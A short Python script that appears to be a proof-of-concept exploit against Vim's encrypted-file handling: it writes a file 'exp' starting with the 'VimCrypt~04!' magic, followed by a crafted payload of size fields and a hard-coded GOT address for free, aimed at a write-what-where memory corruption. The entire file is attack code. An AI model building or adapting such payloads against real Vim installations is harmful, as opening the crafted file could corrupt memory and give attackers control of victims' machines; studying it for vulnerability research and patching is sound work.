import struct


def p32(content):
    return struct.pack('>I', content)

def p64(content):
    return struct.pack('>Q', content)

def main():
    magic = b'VimCrypt~04!'
    free_at_got = 0x8a8238

    write_what = b'\x00'
    write_to = free_at_got

    payload = p32(0xffffffff ^ 0x61)
    payload += write_what
    payload += p32(0xffffffff ^ 0x61)
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to) # buffer
    payload += b'\xff' * 3
    #payload += p32(0x8)
    #payload += 'a' * 0x1000

    with open('exp', 'wb') as f:
        f.write(magic + payload)


if __name__ == '__main__':
    main()
